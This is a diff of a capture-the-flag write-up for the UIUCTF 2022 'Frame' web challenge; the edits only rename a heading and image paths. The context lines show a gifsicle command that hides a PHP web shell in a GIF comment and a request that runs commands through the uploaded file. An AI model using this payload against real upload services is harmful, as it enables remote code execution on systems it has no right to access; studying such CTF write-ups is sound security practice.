@@ -1,4 +1,4 @@
-# UIUCTF 2022
+# UIUCTF 2022 (web)
 
 ## Frame
 
@@ -87,7 +87,7 @@ gifsicle < frame-1.gif --comment "<?php system('cd / && cat flag'); ?>" > output
 
 flag in some confusing thing like this:
 
-![](<../.gitbook/assets/image (1) (1).png>)
+![](<../.gitbook/assets/image (1) (1) (2).png>)
 
 #### Firstway but easier \~
 
@@ -99,7 +99,7 @@ Now we can rce ez by web shell
 
 > /uploads/c654036b5974c786-output.php.gif?command=ls%20-a
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (1).png>)
 
 
 
